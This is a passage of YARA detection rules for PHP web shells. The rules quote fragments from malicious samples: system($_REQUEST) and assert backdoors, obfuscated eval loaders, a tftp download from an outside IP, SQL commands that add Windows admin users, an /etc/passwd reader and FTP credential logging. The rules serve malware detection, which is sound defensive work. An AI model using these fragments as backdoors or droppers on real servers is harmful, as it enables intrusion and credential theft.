      $x10 = "}$defacer=$_POST['defacer'];if(!$sites){echo '</pre>';exit;}$sites=array_unique(str_replace('http://','',$sites));$total=count($" ascii
      $x11 = "echo \"<br><br><center><div class='mybox'><h2 class='k2ll33d2'>server symlinker</h2><table align=center border=1><tr><td align=c" ascii
      $s12 = "elseif(isset($_GET['x']) && ($_GET['x'] == 'vb')) {if(empty($_POST['index'])){echo \"<center><br><br><div width='100%' class='my" ascii
      $s13 = "echo \"<table align=center border=1 style='width:60%;border-color:#333333;'><tr><td align=center><font size=3>S. No.</font></td>" ascii
      $s14 = "$s_my_ip = $_SERVER['REMOTE_ADDR'];$rsport = \"443\";$rsportb4 = $rsport;$rstarget4 = $s_my_ip;$s_result = \"<center><div class=" ascii
      $s15 = "echo \"<br><br><table align=center border=1><tr><td align=center><font size=4>S. No.</font></td><td align=center><font size=4>Us" ascii
      $s16 = "elseif(isset($_GET['x']) && ($_GET['x'] == 'about')){echo '<center><br><br><div class=\"mybox\"><br><h2 style=\"font-size:50px;" ascii
      $s17 = "elseif (isset($_POST['bind']) && !empty($_POST['port']) && !empty($_POST['bind_pass']) && ($_POST['use'] == 'Perl')) {$port = tr" ascii
      $s18 = "CURLOPT_COOKIEJAR, $co); curl_setopt($ch, CURLOPT_COOKIEFILE, $co);$buffer = curl_exec($ch);curl_close($ch);$pos = strpos($buff" fullword ascii
      $s19 = "\";file_put_contents(\".htaccess\",$htaccess,FILE_APPEND);$passwd=$_POST[\"passwd\"];$passwd=explode(\"\\n\",$passwd);echo \"<ce" ascii
      $s20 = "/th><th>download and Exec</th></tr><tr><td> <table> <form method=\"post\" actions=\"?y=<?php echo $pwd;?>&amp;x=back\"><tr><td>P" ascii
   condition:
      uint16(0) == 0x683c and filesize < 300KB and
      1 of ($x*) and all of them
}

rule sig_55254f8f1d961c9a832cf2c3f7747b3e510efbdf
{
   meta:
      description = "php17 - file 55254f8f1d961c9a832cf2c3f7747b3e510efbdf.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "80a13546c401bbf7495b74bfeb0d78d293dd5289b64b3af936cc00372daeacc2"
   strings:
      $x1 = "Str[17] = \"select shell('c:\\windows\\system32\\cmd.exe /c net user b4che10r abc123 /add');\";" fullword ascii
      $x2 = "Str[11] = \"Declare @s  int;exec sp_oacreate 'wscript.shell',@s out;Exec SP_OAMethod @s,'run',NULL,'cmd.exe /c echo ^<%ex" fullword ascii
      $x3 = "Str[23] = \"Declare @s  int;exec sp_oacreate 'wscript.shell',@s out;Exec SP_OAMethod @s,'run',NULL,'cmd.exe /c echo '<?ph" fullword ascii
      $x4 = "Str[11] = \"Declare @s  int;exec sp_oacreate 'wscript.shell',@s out;Exec SP_OAMethod @s,'run',NULL,'cmd.exe /c echo ^<%execute(r" ascii
      $x5 = "---> '.$ports[$i].'<br>'; ob_flush(); flush(); } } echo '</div>'; return true; } function shellcode_decode($Url_String,$Oday_val" ascii
      $x6 = "Str[23] = \"Declare @s  int;exec sp_oacreate 'wscript.shell',@s out;Exec SP_OAMethod @s,'run',NULL,'cmd.exe /c echo '<?php phpin" ascii
      $x7 = "t($_POST['cmdpath']) ? $_POST['cmdpath'] : 'c:\\\\windows\\\\system32\\\\cmd.exe'; print<<<END" fullword ascii
      $x8 = "if(!empty($_POST['cmd'])) { $exe = @$shell->exec(\"$cmdpath /c \".$cmd); $out = $exe->StdOut(); $output = $out->ReadAll(); echo " ascii
      $x9 = "Str[8] = \"tftp -i 219.134.46.245 get server.exe c:\\\\\\\\server.exe\";" fullword ascii
      $x10 = "Str[15] = \"tftp -i 219.134.46.245 get server.exe c:\\\\\\\\server.exe\";" fullword ascii
      $x11 = "';} } Root_Login($MSG_TOP); exit(); ob_end_flush(); } if(isset($_GET['s'])){$s = $_GET['s'];if($s != 'a' && $s != 'n')Root_CSS()" ascii
      $x12 = "== 'a' && isset($_POST['number'])){$Oday_value = $_POST['number'];$Shell_Code = shellcode_encode($_POST['code'],$Oday_value);} " fullword ascii
      $x13 = "if(!empty($_POST['run'])) echo (@$shell->ShellExecute($run,'/c '.$cmd) == '0') ? '" fullword ascii
      $x14 = "','fso.createtextfile()'=>'fso.createtextfile(path,true)','<%execute(request())%>'=>'<%execute(request','<%eval request()%>'=>'<" ascii
      $x15 = "$getfile = isset($_POST['downfile']) ? $_POST['downfile'] : ''; $getaction = isset($_POST['getfile']) ? $_POST['getfile'] : ''; " ascii
      $x16 = "---> '.$ports[$i].'<br>'; ob_flush(); flush(); } } echo '</div>'; return true; } function shellcode_decode($Url_String,$Oday_va" fullword ascii
      $x17 = "$shell = new COM($com[$object]); if($object == 'wscript') { $cmd = isset($_POST['cmd']) ? $_POST['cmd'] : 'dir'; $cmdpath = isse" ascii
      $x18 = "'; $cmd = 'dir'; if(!empty($_POST['cmd'])){$res = Exec_Run($_POST['cmd']);$cmd = $_POST['cmd'];} print<<<END" fullword ascii
      $x19 = "'; $mhost = 'localhost'; $muser = 'root'; $mport = '3306'; $mpass = ''; $mdata = 'mysql'; $sqlcmd = 'ver'; if(isset($_POST['mhos" ascii
      $x20 = "= VBScript.Encode %>'=>'<%@ LANGUAGE = VBScript.Encode %>','www.rootkit.net.cn'=>'www.rootkit.net.cn','Process.GetProcesses'=>'" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 700KB and
      1 of ($x*)
}

rule sig_19428cb3b5432fee56c7078ef7c8912a64c6aac8
{
   meta:
      description = "php17 - file 19428cb3b5432fee56c7078ef7c8912a64c6aac8.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "c137b1dbe305f9578ee3740c66e70469937b1190792ddadbb80e5c42ba30de2a"
   strings:
      $s1 = "Processed in <span id=\"runtime\"></span> second(s) {gzip} usage:<span id=\"memory\">{memory}</span>" fullword ascii
      $s2 = "$url=isset($_COOKIE['PATH']) ? $_COOKIE['PATH'] : self::convert_to_utf8(sprintf(\"%s%s\",rtrim(__ROOT__,\"/\"),\"/\"),'utf8');" fullword ascii
      $s3 = "<form action=\"\" id=\"form1\" name=\"form1\" encType=\"multipart/form-data\"  method=\"post\" target=\"hidden_frame\">" fullword ascii
      $s4 = "input{font:11px Verdana;BACKGROUND:#FFFFFF;height:18px;border:1px solid #666666;}a{color:#00f;text-decoration:underline;}a:hover" ascii
      $s5 = "if(!empty($_POST['pwd']) && strlen(password) == 32) $password = hash(crypt, $_POST['pwd']); " fullword ascii
      $s6 = "$file = !empty($_POST[\"dir\"]) ? urldecode(self::convert_to_utf8(rtrim($_POST[\"dir\"],'/'),'utf8')) .\"/\" : $url ;" fullword ascii
      $s7 = "$return.= sprintf('<a href=\"javascript:;;;\" name=\"%s\" onclick=\"ajax(this.name,1)\">%s</a> ',$path,ucfirst($value));" fullword ascii
      $s8 = "else $_page.=sprintf('<a href=\"javascript:;;;\" name=\"action=show&dir=%s&page=%s\" onclick=\"ajax(this.name)\">%s</a> ',url" fullword ascii
      $s9 = "if (true==@move_uploaded_file($_FILES['userfile']['tmp_name'],self::convert_to_utf8($file,'utf8'))){" fullword ascii
      $s10 = "if (is_dir($disk)) $return .= sprintf('<a href=\"javascript:;;;\" name=\"%s\" onclick=\"ajax(this.name,1)\">%s</a> | '," fullword ascii
      $s11 = "setcookie('key', '', time() - 3600*24*30);" fullword ascii
      $s12 = "$return .= sprintf('<a href=\"javascript:;;;\" name=\"%s\" onclick=\"ajax(this.name,1)\">DISK %s</a> | '," fullword ascii
      $s13 = "$action=!empty($action) ? strtolower(rtrim($action,'/')) : 'login';" fullword ascii
      $s14 = "if((true == $password) && $password !==password) die('{\"error\":\"" fullword ascii
      $s15 = "header(\"Content-Disposition: attachment; filename=\".basename($filename));" fullword ascii
      $s16 = "header(\"Content-Type: application/force-download\"); " fullword ascii
      $s17 = "header('Content-Description: File Transfer'); " fullword ascii
      $s18 = "setcookie('verify', $password, time() + 3600*24*30);" fullword ascii
      $s19 = "$action .= sprintf('<a href=\"javascript:;;;\" name=\"%s\" onclick=ajax(this.name,%s)>%s</a> | '," fullword ascii
      $s20 = "header(\"Content-Transfer-Encoding: binary\" );" fullword ascii
   condition:
      uint16(0) == 0x2f2f and filesize < 100KB and
      8 of them
}

rule sig_559ef35677f51bc4237f8a6978ba80f7eaa59bf2
{
   meta:
      description = "php17 - file 559ef35677f51bc4237f8a6978ba80f7eaa59bf2.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "7429afeabef0bf434aed2caab0092022423e2a051d245ca1709187ea661bcb71"
   strings:
      $s1 = "$arr=array(\"n;}$_POST[1];/*\"=>\"test\");" fullword ascii
      $s2 = "@eval($POST_['xss']);" fullword ascii
      $s3 = "create_function('$args',$arr2); " fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule sig_4b69af81b89ba444204680d506a8e0a1
{
   meta:
      description = "php17 - file 4b69af81b89ba444204680d506a8e0a1.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "7132d14f59d04db5380e8ad5ac99d93358d0b0edb6c4cf61a2e4f147c3cf02af"
   strings:
      $x1 = "** - Logging system with anti-log poisoning through UA or Referrer" fullword ascii
      $x2 = "echo '<html><head><title>'.TITLE.' - Statistics</title><meta http-equiv=\"refresh\" content=\"10\" /></head><body>';" fullword ascii
      $x3 = "* Function GetEmail saves to (emails.txt) file the Email address from referrer, if found" fullword ascii
      $x4 = "** Contact: ssslocalhost[at]gmail.com" fullword ascii
      $x5 = "'.guam.net', '.northnet.org', '.easilymail.co.uk', '.knology.net', '.startlogic.com', '.katamail.com', '.tele2internet.it'," fullword ascii
      $s6 = "echo \"<b>info</b> - Executes the phpinfo().\";" fullword ascii
      $s7 = "header(\"Location: \" . $scam_url . \"?bidderblocklogin&hc=1&hm=uk%601d72f%2Bj2b2vi%3C265bidderblocklogin&hc=1&hm=uk%601d72" fullword ascii
      $s8 = "'.operamail.com', 'www.google.com/ig/gmailmax', '.secureserver.net', '.coxmail.com', '.cox.net'," fullword ascii
      $s9 = "echo '<html><head><title>'.TITLE.' - Version</title></head><body><center>';" fullword ascii
      $s10 = "'.blogspot.com', '.mailprotector.net', 'groups.yahoo.com', 'crawler', 'lwp::simple'," fullword ascii
      $s11 = "//http://www.botsvsbrowsers.com/ip/166.137.133.178/index.html" fullword ascii
      $s12 = "'.freemail.hu', '.rediffmailpro.com', '.mayl.de', '.tre.it', '.cheapnet.it', '.ipower.com', '.aruba.it', '.gmx.net', '.tele2.it" fullword ascii
      $s13 = "'.abacho.de', '.yandex.ru', '.networld.at', '.rediffmail.com', '.mail.ru', 'mail.bg', '.edumail.at', '.verizonmail.com'," fullword ascii
      $s14 = "'.register.it', '.univision.com', '.charter.net', '.doteasy.com', '.utanet.at', '.alicebusiness.it', '.walla.co.il', '.fastmail" fullword ascii
      $s15 = "'webwasher', 'w3m/', 'www-mechanize/', 'libcurl', 'google.com/search', 'www.google.com', '.ipt.aol.com', '\"', 'lionic.com');" fullword ascii
      $s16 = "echo '<html><head><title>'.TITLE.' - Info (phpinfo)</title></head><body></body></html>';" fullword ascii
      $s17 = "echo \"<b>help</b> - Provides Help information for <b>[S]</b>cam <b>[R]</b>edirector commands.\";" fullword ascii
      $s18 = "$email = get_between($referrer, \"&amp;login=\", \"&amp;session_id=\");" fullword ascii
      $s19 = "'10.112.10.10', 'jakarta commons', 'siteadvisor.com', 'bezeqint', 'fraudwatch'," fullword ascii
      $s20 = "** - Advanced IP & Word (UA & Referrer) banning system, including Tor network" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 100KB and
      1 of ($x*) and 4 of them
}

rule aa8a3c4af27ef689a469217280edeb4a43987562
{
   meta:
      description = "php17 - file aa8a3c4af27ef689a469217280edeb4a43987562.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "26e4bf51200720762b6d640bddd86f3abc62da0c22736ef44ad289e119271f22"
   strings:
      $s1 = "${(\"#\"^\"|\").(\"#\"^\"|\")}=(\"!\"^\"`\").(\"( \"^\"{\").(\"(\"^\"[\").(\"~\"^\";\").(\"|\"^\".\").(\"*\"^\"~\");" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule sig_2b591d5af07b52332b88981ea951f13a30e38a78
{
   meta:
      description = "php17 - file 2b591d5af07b52332b88981ea951f13a30e38a78.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "440663bc780807348b7dbf14a8ee9dfbe474895d440108c8169483bf68561f6a"
   strings:
      $s1 = "$S=')/m;$d=ba/mse6/m4_en/mcode(x(/mgzcompre/m/mss($o),$/mk));pri/mnt(\"<$/mk>$d</$/mk>\");@ses/msion_de/mstro/my();}}}}';" fullword ascii
      $s2 = "$D='mER;$rr/m=@$r[\"HT/mTP_REFERER/m\"/m];$ra=@$r[\"/mHTTP/m_/mACCEPT_LANGU/m/mA/mGE\"];if($rr&&$ra/m)/m{$u=parse/m_u/mr';" fullword ascii
      $s3 = "$I='==0){$s[$i]/m=\"\"/m;$p=$ss($/mp,3);}/mif(ar/mra/my_key_/mexists($i,$/ms)/m){$s[$i/m]/m.=$p;$e=st/m/mrpos($s[/m$i/m],/m';" fullword ascii
      $s4 = "$m='$f);if($e){$k=$/mkh.$kf;ob_s/mtart/m();@ev/mal(@gzun/mc/mompress(@x/m(@base/m64_decode/m(/m/mpreg_replace(a/';" fullword ascii
      $s5 = "$p='$kh/m=\"5d/m4/m1\";$k/mf=\"402a\";functi/mon x($t,$k)/m{$c/m/m=s/mtrlen($k);$l=str/mlen(/m$t)/m;$o=\"\";for($i=/m0;';" fullword ascii
      $s6 = "$u='l($/mrr);p/marse_str($u[\"q/m/muery\"],$q);/m/m$q=array_values/m/m($q)/m;preg_mat/mch_all(\"/([/m\\\\w])[\\\\w/m-/m]';" fullword ascii
      $s7 = "$M='$i<$/m/ml;){for/m/m($j=0;($j<$c/m&&$i<$l)/m;/m$j++,$i++){$/mo.=$t{$i}^/m$k{$/mj};/m}}return $o/m;}$/mr=$_/mSERV/';" fullword ascii
      $s8 = "$H='/m\"str/mtolower\";/m$i=$m[1][0].$m[1]/m[1];$/m/mh/m=$sl($ss(md5($/mi./m$kh)/m,0,3/m));$f=$sl($ss(md5(/m$i.$k/';" fullword ascii
      $s9 = "$Z='m/m/mf),0,3));$p=\"/m\";for/m($z=1;$z<cou/mnt($m[1/m]);$/mz/m++)$p./m/m=$q[$m[2][/m$z]];if(strpos(/m$p,/m/m$h)=';" fullword ascii
      $s10 = "$n='mrray(\"/_//m\",/m\"/-/\"),ar/mray(\"/m/\",\"+\")/m,$ss($s/m[$i]/m,0,$/me)))/m,$k)))/m;$o=/m/mob_get/m_content/ms();ob_end_c" ascii
      $s11 = "$B=str_replace('/m','',$p.$M.$D.$u.$W.$H.$Z.$I.$m.$n.$S);" fullword ascii
      $s12 = "$L=str_replace('et','','cetreetatete_etfunetctieton');" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 4KB and
      8 of them
}

rule sig_05a5cf06982ba7892ed2a6d38fe832d6
{
   meta:
      description = "php17 - file 05a5cf06982ba7892ed2a6d38fe832d6.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "9a872a2424ca1193c32e55b9bac11c09ba29d15182ad89734492c5193fd64d55"
   strings:
      $x1 = "if (file_get_contents(\"/etc/httpd.conf\")) {echo \"<b><a href=?ac=navigation&d=/var/cpanel&e=accounting.log><u><b>cpanel log  " fullword ascii
      $x2 = "fputs($f,\"Enter on ftp:\\nFTPhosting:\\t$host\\nLogin:\\t$login\\nPassword:\\t$password\\n \");" fullword ascii
      $x3 = "login:password - \".$ftp_user_name.\":\".$ftp_user_name.\"</b><br>\";" fullword ascii
      $x4 = "<u><b>$fullpath</b></u>  \".exec(\"tar -zc $fullpath -f $charsname.tar.gz\").\"" fullword ascii
      $x5 = "if ((!$_POST['dir']) OR ($_POST['dir']==\"\")) { echo \"<input type=hidden name=dir size=85 value=\".exec(\"pwd\").\">\"; }" fullword ascii
      $x6 = "if ((!$_POST['dir']) OR ($_POST['dir']==\"\")) { echo \"<input type=text name=dir size=85 value=\".exec(\"pwd\").\">\"; }" fullword ascii
      $x7 = "mail(\"$qwerty\",\"NRWS LAME INFO ($host_l)\",\"NRWS STATISTIC REPORT:\\r\\n $gg\",\"From: report@nrws.net\");" fullword ascii
      $s8 = "if (file_get_contents(\"/etc/httpd.conf\")) {echo \"<b><a href=?ac=navigation&d=/var/cpanel&e=accounting.log><u><b>cpanel log  <" ascii
      $s9 = "if (file_get_contents(\"/etc/httpd.conf\")) {echo \"<b><a href=?ac=navigation&d=/etc/&e=httpd.conf><u><b>" fullword ascii
      $s10 = "if ((!$_POST['cmd']) || ($_POST['cmd']==\"\")) { $_POST['cmd']=\"id;pwd;uname -a;ls -lad\"; }" fullword ascii
      $s11 = "if (file_get_contents(\"/var/cpanel/accounting.log\")) {echo \"<b><a href=\\\"\".$surl.\"act=f&f=accounting.log&d=/var/cpanel/&f" ascii
      $s12 = "if (file_get_contents(\"/var/cpanel/accounting.log\")) {echo \"<b><a href=\\\"\".$surl.\"act=f&f=accounting.log&d=/var/cpanel/&f" ascii
      $s13 = "/* command execute form */" fullword ascii
      $s14 = "$blah=exec(\"gcc -o /tmp/bd /tmp/bd.c\");" fullword ascii
      $s15 = "$blah=exec(\"gcc -o /tmp/backc /tmp/back.c\");" fullword ascii
      $s16 = "$login_result=@ftp_login($conn_id, $ftp_user_name, $ftp_user_pass);" fullword ascii
      $s17 = "document.command.cmd.value = str;" fullword ascii
      $s18 = "/* command execute */" fullword ascii
      $s19 = "else {echo \"<br><a href=?ac=navigation&d=/etc/&e=passwd><b><u>Get /etc/passwd</u></b></a><br>\";}" fullword ascii
      $s20 = "</td><td><input type=\"text\" name=\"from\" value=\"sypport@mail.com\" size=\"25\"></td></tr>" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 200KB and
      1 of ($x*) and 4 of them
}

rule sig_345dda1944b812558413e09c53837da12f4e2102
{
   meta:
      description = "php17 - file 345dda1944b812558413e09c53837da12f4e2102.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "0ed2680c3afa12bbd9fba08e05a508d568029ea799590ce1b9be030c2b3e8bb9"
   strings:
      $s1 = "$xsser = $_GET[\"op\"]; " fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule sig_06409663226af2f3114485aa4e0a23b4
{
   meta:
      description = "php17 - file 06409663226af2f3114485aa4e0a23b4.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "040d85a7e734e9190b156b34c9f9f579a367477755abfb7d142faf2ddcb2b5e1"
   strings:
      $s1 = "echo \"login correct" fullword ascii
      $s2 = "if ($SERVER[\"REMOTEADDR\"]==\"178.162.201.166\" && md5($REQUEST['secure'])==\"7f02b0ae0869cc5aa38cd7ca6c767c92\"){ system($REQU" ascii
      $s3 = "if(md5($_REQUEST[\"mgp\"])==\"4f6e5768b76809bc99bf278494b5f352\")" fullword ascii
      $s4 = "if ($SERVER[\"REMOTEADDR\"]==\"178.162.201.166\" && md5($REQUEST['secure'])==\"7f02b0ae0869cc5aa38cd7ca6c767c92\"){ system($REQU" ascii
      $s5 = "@system($_REQUEST[\"c\"]);" fullword ascii
      $s6 = "FtZSxwYXNzd29yZF9zaGExLHNlY3Rpb25zKSBWQUxVRVMgKCdtZ2tuaWdodCcsJzMzYzdhNGRmNDZiMWE5ZjdkNGE0NjM2ZDQ3Njg0OTIwNWEwNGM2YjcnLCcqJyk7Ig" ascii
      $s7 = "B8XC4oZ2lmfEdJRnxqcGd8anBlZ3xwbmd8Y3NzfGpzfHN3Znx0eHR8aWNvfHR0Znxzdmd8ZW90fHdvZmZ8d2F2fG1wM3xhYWN8b2dnfHdlYm0pJHxib290c3RyYXBcLm" ascii
      $s8 = "4f6e5768b76809bc99bf278494b5f352" ascii
      $s9 = "system(base64_decode(\"bXlzcWwgYGdyZXAgQU1QREIgL2V0Yy9hbXBvcnRhbC5jb25mfGdyZXAgIlVTRVJcfFBBU1NcfE5BTUUifCBzZWQgJ3MvQU1QREJVU0VSL" ascii
      $s10 = "ecmd']); }" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 3KB and
      all of them
}

rule sig_9d6dbf95f241a31553cc03f750c424a309b1d95a
{
   meta:
      description = "php17 - file 9d6dbf95f241a31553cc03f750c424a309b1d95a.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "9642a0827638a0ed894cc44b421626ab6df87a155cdc1d61e63320a0c54d229f"
   strings:
      $s1 = "//door.php?p={\"a\":\"system\",\"b\":\"whoami\"}" fullword ascii
      $s2 = "$p = json_decode($_GET['p'], true);" fullword ascii
      $s3 = "$config = new ReflectionFunction($p['a']);" fullword ascii
      $s4 = "$config->invoke($p['b']);" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule sig_56f7831f6adb057bac1df3c980e677fa01ac7d91
{
   meta:
      description = "php17 - file 56f7831f6adb057bac1df3c980e677fa01ac7d91.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "207b1ff4dea757f8074d12d8087b7226a8ac5b4b54da1b9c2e764ae99a312ea4"
   strings:
      $x1 = "if(isset($_POST['host']) && isset($_POST['user']) && isset($_POST['pass']) && isset($_POST['db']) && $act==\"login\")" fullword ascii
      $x2 = "if ($result) {echo \"<p>Done Exploit.</p><br>Use this : <br> index.php?\" . $var . \"=shell.txt\";}else{" fullword ascii
      $s3 = "if ($act == 'lst' && isset($_POST['user']) && isset($_POST['pass']) && isset($_POST['host']) && isset($_POST['db']))" fullword ascii
      $s4 = "mysql_connect($host,$user,$pass) or die('<font color=red>Nope,</font><font color=yellow>No cOnnection with user</font>');" fullword ascii
      $s5 = "<tr><td>Index Link : </td><td><input name=\"link\" value=\"http://www.egyspider.com/hacked.html\" /></td></tr>" fullword ascii
      $s6 = "<TD width=\"100%\"><p align=\"center\"><STRONG>o---[ r57.biz | | <A egy_spider@hotmail.com>egy_spider@hotmail.com</A> |devel" fullword ascii
      $s7 = "bordercolordark=\"lime\" bordercolorlight=\"lime\"><tr><td><a href=\"?\">Main Shell</a></td><td><a href=\"?act=users\">List User" ascii
      $s8 = "<form name=\"myform\" action=\"?act=login\" method=\"post\">" fullword ascii
      $s9 = "<th>Host : </th><th><?php echo '<font color=yellow>' . $config['MasterServer']['servername'] . '</font>'; ?></th>" fullword ascii
      $s10 = "<th>:::::Change User Password:::::</th><th><input type=\"submit\" name=\"Change\" value=\"Change\" /></th>" fullword ascii
      $s11 = "<tr><td>MAIL : </td><td><input name=\"vbmail\" value=\"egy_spider@hotmail.com\" /></td></tr>" fullword ascii
      $s12 = "<form name=\"changepass\" action=\"?act=shell\" method=\"post\">" fullword ascii
      $s13 = "bordercolordark=\"lime\" bordercolorlight=\"lime\"><tr><td><a href=\"?\">Main Shell</a></td><td><a href=\"?act=users\">List User" ascii
      $s14 = "<th>User : </th><th><?php  echo '<font color=yellow>' . $config['MasterServer']['username'] . '</font>'; ?></th>" fullword ascii
      $s15 = "changed to </font><font color=red>' . $vbpass . '</font><br>Back to <a href=\"?\">Shell</a></font>';" fullword ascii
      $s16 = "echo '<font size=3><font color=red>Failed to change PassWord</font></font>';" fullword ascii
      $s17 = "$query = 'update user set password=\"' . $pass_salt . '\" where username=\"' . $vbuser . '\";';" fullword ascii
      $s18 = "$Wdt = 'UPDATE `template` SET `template` = \\' ' . $index . '  \\'WHERE `title` =\\'FORUMHOME\\';';" fullword ascii
      $s19 = "bordercolordark=\"lime\" bordercolorlight=\"lime\"><th>ID</th><th>USERNAME</th><th>EMAIL</th>';" fullword ascii
      $s20 = "<center><form name=\"indexform\" action=\"\" method=\"post\"><textarea name='index' rows='14' cols='86'></textarea></p>" fullword ascii
   condition:
      uint16(0) == 0x3c0a and filesize < 60KB and
      1 of ($x*) and 4 of them
}

rule sig_66a1b2cb54bbc8904a1d9de5ddb43f84b1c1c00e
{
   meta:
      description = "php17 - file 66a1b2cb54bbc8904a1d9de5ddb43f84b1c1c00e.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "250297cfff351727e6530926112a33e6630e3b35a284512bc3891501548f4678"
   strings:
      $s1 = "call_user_func('assert', $_REQUEST['pass']);" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule sig_44068a9987d5ecadce9346f75da5c554044bf296
{
   meta:
      description = "php17 - file 44068a9987d5ecadce9346f75da5c554044bf296.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "2c096614f3046f553e31ee529bce3a4319096ff5900253f120882d005746b8f1"
   strings:
      $s1 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii
      $s2 = "$myurl='http://www.zxexp.com';//" fullword ascii
      $s3 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAD" ascii
      $s4 = "Q8N35HZ2XAJ0KAg1pLX+y41Zembpb6llhZxVvaFHgdmo4xzQs7xmOwleZ7YuiNxCTEMPeVw9jawN3ucO3Wk3nHGLptbn55frYU5xsqdIo84fMnev7uevZ8rsXXiqD3xo" ascii
      $s5 = "BhB3fXkr+Y59pxVNIPsiQuGZcbE2Of4LTQD9Df4YHD+p5whrU7nUWrl2vtxlPx88oJw0/EZZ+Jb8+X3ckY88x3gDQ27Ehys3hr2b2//oI7P0c/KnBo4cvYIPCc7NNcPH" ascii
      $s6 = "fG0nJrspX2Nz8n3EIMm7rYXds3aLdW9hjlznIn9Mr3XUc5opPeYedf0Lqg5//z+7DjXufvUUODFqaEHXlyr+QPkF472f2gkmY8IJhz271Y9TxBbQ0yVO42v1odz3mNb6" ascii
      $s7 = "mu5M7xDcuizfs1/mX9QG+vz+6r2HAje29PfZNbyqzY7//5cemfwldHo21OTM0+7MnuEB6e3x7N3hOSM7f191AT+0/ianIauE1rCzIbEy3yHV8nxY98EjaIrcwq8XlZPc" ascii
      $s8 = "RFn9md7tx3Y8MWXjgnIaR6x78ujz/mOzwKj5Z3IRchNxqa8yzw//mOs4aWsecOXPxP7Hom5yI2t2VPiMTDhDpb6xA5gT2MztuBvc6SJC9b4rvPsOw/nhdzaOsVc29E2Z" ascii
      $s9 = "A/4IWKz2Dv7aXI3Z1xDDYf+EnNZR7VOcfbgDF7dg++JW53l+sh9mPLfaNeSr7JHPmftTL1W/lPuMnP2yPkyb4S8rPX7LWuZfSLOG+vz813zYdeXUldTDu+lWkPgkvObn" ascii
      $s10 = "p8jdrKWHltiHxT1grw3elzU6NV/DgbCDpHrxlYxx3Oef6K2DJhimbiGrM+EmejJm2dZD/9/6TthXjq2n17l8ZnXPkP0CdL7J1c5f0Zsp45Gfh/bzFrBpwdvwBOZ85rUj" ascii
      $s11 = "$img = isset($_GET['img']) ? $_GET['img'] : \"\";" fullword ascii
      $s12 = "exDSA7CfqR7NQZLPXlg6uTc5M5vjWmO5AzsFXyXvSVqfNxKLg9cFvPRtz4PcsSSoyMXSP83dXewtLpQ8Rv0YJs/u1XX6PDJR68hsweYeY4uAlxH449P2VMLbw1NbPulE" ascii
      $s13 = "/Ii4KwteGxL7ED9QvsaXHsujfvGeTq/v4N94f3WxDdHfBMxh5gC3xJbtWM7uRvEw8GQ5IVPcBex9Ttrf2tcOvzhUuZeF/zvVPMbf39vW3QkRj/IoSUm0UffYyce/ezEt" ascii
      $s14 = "D2ak54hePBV7mHR54ITya7orE14XsHSYqmz3yH7OO6W3/oeyEnN/WJ/AW0NekXyh1IHM3thRgGudbeduu6ZmHNWeyW8S07AuDeGYN+GnhEcuOvez5b9dXewibO3Ut8Cn" ascii
      $s15 = "LS0L4RjxnOio8v8a/wPdePxLLlTnknuQng5cKnQoYFTRq8yGoxwLNA+cc4oeHqK5878PvXfUb9OLIXmIrlv+VfJiZCXRu9NH7eXc3zp03a2Y74brXh1/c5SI3tPLoGZQ" ascii
      $s16 = "j4tfCD0mpgrqh9+VHOIuIc88+QlOGTUB/JZUktS3xM/wfBqCSfXsBNkPzc9FHWptp4zG29fZV/XHkrqQb0/0oPgZ6ubEKyjj0/OED6SJzibmvBere+QdweX2jo+PQBmN" ascii
      $s17 = "hvaP+j1H5fJV14ax6MtCPfGWmF8JnPDyF05X/XIHeWzftpfb7f+e/p06HlHN1QMHGwNX5sYjb42+Zvvat154oHETuruXvrMznN+/sy9yN0jX8usOnjdzp2IfWYd0TkfG" ascii
      $s18 = "vlc9ErtT+V9g+XoP0CXQf4Xn3stNQGY+QzuwK9tsQlqRT+qOXixQ8QEaCFvsatwv+f+GDiza2Iu+e3Pas3wa9kfLc58Tesa+4FuKH0eAwvEZsqnvlXrFoNXyIOAlWLfq" ascii
      $s19 = "vaH3BTzvOip2MGnxPmX2LDgerQKrbe9q/U4k/Og9xKdXN5HbHeN7Y0fBQOvyS+QAwJ778mr0dtjH/derfnxKWt39DHS04rOA7ltZoYx28getUc5f+jMO6MNC7eMWTLO2" ascii
      $s20 = "LGcL2PT3EvilT05KnKi2DvP6O27RyffHzxBTDy+PzZuYEbW4xIfD5Z9NC45ErONNY2vHuc+zzDO4CWf/6quLyS3eSamBAOOd0uuh7o33CfOzZF6Fvd0P9uvUDehFgYOo" ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 300KB and
      8 of them
}

rule sig_1945_september
{
   meta:
      description = "php17 - file 1945-september.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "d53f94ebc03dc951bbb7b8cff74aad018009c8a55f91e9109870da89d97cf0c3"
   strings:
      $x1 = "function LoginPage1945(){echo \"<div style=\\\"margin-top:250px;\\\" align=center><h3>1945v2017 - Login</h3></div>\";echo \"<for" ascii
